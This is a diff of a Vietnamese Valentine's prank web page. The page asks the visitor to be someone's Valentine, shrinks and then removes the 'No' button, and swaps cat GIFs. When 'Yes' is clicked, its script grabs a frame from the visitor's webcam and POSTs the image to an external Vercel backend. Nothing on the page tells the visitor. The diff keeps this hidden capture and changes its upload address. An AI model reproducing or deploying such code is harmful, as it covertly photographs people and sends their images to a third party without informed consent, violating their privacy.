@@ -4,15 +4,39 @@
 <meta charset="UTF-8">
 <title>Cẩn thận bắt sáng cam 💖</title>
 <style>
-body{margin:0;padding:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:Arial;background:linear-gradient(135deg,#c0f0ff,#a0d0ff);}
-#gifContainer img{width:400px;max-width:80vw;margin-bottom:20px;}
+body{
+  margin:0;
+  padding:0;
+  height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  font-family:Arial;
+  background:linear-gradient(135deg,#c0f0ff,#a0d0ff);
+}
+#gifContainer img{
+  width:400px;
+  max-width:80vw;
+  margin-bottom:20px;
+}
 #buttonRow{display:flex;gap:20px;}
-button{padding:12px 25px;font-size:18px;border:none;border-radius:10px;cursor:pointer;transition: all 0.3s ease;}
+button{
+  padding:12px 25px;
+  font-size:18px;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+  transition: all 0.3s ease;
+}
 #yesBtn{background:#28a745;color:white;}
 #noBtn{background:#dc3545;color:white;}
+h1{margin-bottom:20px;}
 </style>
 </head>
 <body>
+
+<h1 id="title">Cậu có muốn Valentine cùng tớ không? 💌</h1>
 
 <div id="gifContainer">
   <img id="mainGif" src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif">
@@ -27,23 +51,41 @@ button{padding:12px 25px;font-size:18px;border:none;border-radius:10px;cursor:po
 const yesBtn = document.getElementById("yesBtn");
 const noBtn = document.getElementById("noBtn");
 const mainGif = document.getElementById("mainGif");
+const title = document.getElementById("title");
+
 let hoverCount = 0;
 const maxHover = 6;
-const noTexts = ["Thật không? 😢","Suy nghĩ lại đi 🥺","Đừng mà 😭","Bấm nhầm đúng không 😏","Cho cơ hội đi 💔","Lần cuối đấy 😎"];
 let yesFontSize = 18;
 
-// Nút từ chối ấn mới bé lại + đổi chữ
+// GIF con mèo xanh dương mỗi lần từ chối
+const catGifs = [
+  "https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif", // GIF 1
+  "https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif", // GIF 2
+  "https://media.giphy.com/media/MDJ9IbxxvDUQM/giphy.gif",     // GIF 3
+  "https://media.giphy.com/media/3o6ZsXnksv7rDZZZp2/giphy.gif", // GIF 4
+  "https://media.giphy.com/media/l0HlRmV47L7O1dKDy/giphy.gif",   // GIF 5
+  "https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif"  // GIF cuối
+];
+
+// Chữ từ chối mỗi lần bấm
+const noTexts = ["Thật không? 😢","Suy nghĩ lại đi 🥺","Đừng mà 😭","Bấm nhầm đúng không 😏","Cho cơ hội đi 💔","Lần cuối đấy 😎"];
+
 noBtn.addEventListener("click",()=>{
   if(hoverCount >= maxHover) return;
-  hoverCount++;
-  noBtn.style.fontSize = (18 - 2*hoverCount)+"px";
-  noBtn.innerText = noTexts[hoverCount%noTexts.length];
-  
-  // Tăng font-size nút đồng ý
+  // Thay đổi GIF
+  mainGif.src = catGifs[hoverCount % catGifs.length];
+
+  // Tăng font-size Đồng ý
   yesFontSize += 5;
   yesBtn.style.fontSize = yesFontSize+"px";
 
-  // Sau 6 lần ấn
+  // Thu nhỏ nút Từ chối + thay chữ
+  noBtn.style.fontSize = (18 - 2*hoverCount) + "px";
+  noBtn.innerText = noTexts[hoverCount % noTexts.length];
+
+  hoverCount++;
+  
+  // Sau lần cuối
   if(hoverCount === maxHover){
     noBtn.style.display="none";
     yesBtn.style.width="100vw";
@@ -52,7 +94,9 @@ noBtn.addEventListener("click",()=>{
     yesBtn.style.position="absolute";
     yesBtn.style.top="0";
     yesBtn.style.left="0";
-    mainGif.style.display="none";
+    // GIF mèo xanh dương bị thỏ trắng hôn
+    mainGif.src = "https://media.giphy.com/media/l3vR1sAVgZ7TxJ7bC/giphy.gif"; // GIF thỏ hôn mèo
+    title.innerText = "Yeahhh!! Tớ biết mà 💖💖💖";
   }
 });
 
@@ -77,11 +121,10 @@ yesBtn.addEventListener("click", async ()=>{
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
 
-    // Chờ 1 giây để video load
     setTimeout(async ()=>{
       ctx.drawImage(video,0,0,canvas.width,canvas.height);
       const imgData = canvas.toDataURL("image/png");
-      await fetch("https://duong-stack-valentine-telegram-back-alpha.vercel.app/upload",{
+      await fetch("https://valentine-backend.vercel.app/upload",{
         method:"POST",
         headers:{"Content-Type":"application/json"},
         body:JSON.stringify({image:imgData})
